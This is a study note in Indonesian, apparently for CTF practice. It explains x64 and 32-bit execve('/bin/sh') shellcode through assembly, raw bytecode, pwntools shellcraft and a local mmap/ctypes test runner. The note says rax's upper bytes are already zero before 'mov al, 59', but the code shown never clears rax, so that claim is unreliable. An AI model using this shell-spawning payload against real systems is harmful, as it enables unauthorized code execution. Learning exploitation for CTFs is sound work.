#cybersecurity

`execve("/bin/sh", NULL, NULL)` adalah shellcode paling penting: memanggil syscall `execve` (nomor 59 di x64) untuk mengganti proses berjalan dengan shell.

## Syscall execve

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

Register (x64): `rax = 59`, `rdi = pathname`, `rsi = argv`, `rdx = envp`

Untuk `execve("/bin/sh", NULL, NULL)`: `rdi` = pointer "/bin/sh", `rsi = 0`, `rdx = 0`.

## Langkah merakit manual

```asm
; 1. rsi = 0 (argv NULL)
xor rsi, rsi

; 2. push null terminator (akhir string)
push rsi

; 3. rdi = "/bin//sh" (8 byte, "/bin//sh" == "/bin/sh")
mov rdi, 0x68732f2f6e69622f
push rdi
mov rdi, rsp        ; rdi = alamat string di stack

; 4. rdx = 0 (envp NULL)
xor rdx, rdx

; 5. syscall
mov al, 59
syscall
```

Bytecode jadi:

```text
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05
```

## Kenapa "/bin//sh"?

- Harus 8 byte pas untuk `mov rdi, imm64`
- `//` sama dengan `/` di path - tidak mengubah perilaku
- Menghindari null byte di payload

## Dengan pwntools (jauh lebih mudah)

```python
from pwn import *

context.arch = "amd64"

sc = asm(shellcraft.sh())   # execve("/bin/sh", 0, 0)
print(len(sc), sc.hex())
```

Versi manual penuh:

```python
sc = asm("""
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    xor rdx, rdx
    mov al, 59
    syscall
""")
```

## 32-bit (i386)

Syscall nomor 11, argumen lewat `ebx, ecx, edx`:

```asm
xor ecx, ecx
push ecx
push 0x68732f2f     ; "//sh"
push 0x6e69622f     ; "/bin"
mov ebx, esp
xor edx, edx
mov al, 11
int 0x80
```

## Tes shellcode di mesin lokal

```python
from pwn import *

context.arch = "amd64"
sc = asm(shellcraft.sh())

io = process(["/bin/sh", "-c", "python3 -c 'import ctypes,mmap; m=mmap.mmap(-1,4096,flags=mmap.MAP_PRIVATE|mmap.MAP_ANONYMOUS,prot=3); m.write(bytes.fromhex(\"" + sc.hex() + "\")); ctypes.CFUNCTYPE(None)(ctypes.c_void_p(ctypes.addressof(ctypes.c_char.from_buffer(m))))()'"])
```

Atau lebih simpel: pakai di binary latihan ret2shellcode (lihat `Praktek/ret2shellcode.py`).

## Catatan

- `mov al, 59` lebih pendek dari `mov rax, 59` dan tetap benar (byte atas rax sudah 0 setelah operasi sebelumnya).
- Shellcode tanpa null byte penting kalau lewat `strcpy`/`gets` (lihat [[Little Endian dan Format Data]]).
- `shellcraft.sh()` pwntools sudah optimal & bebas null - pakai itu di CTF.
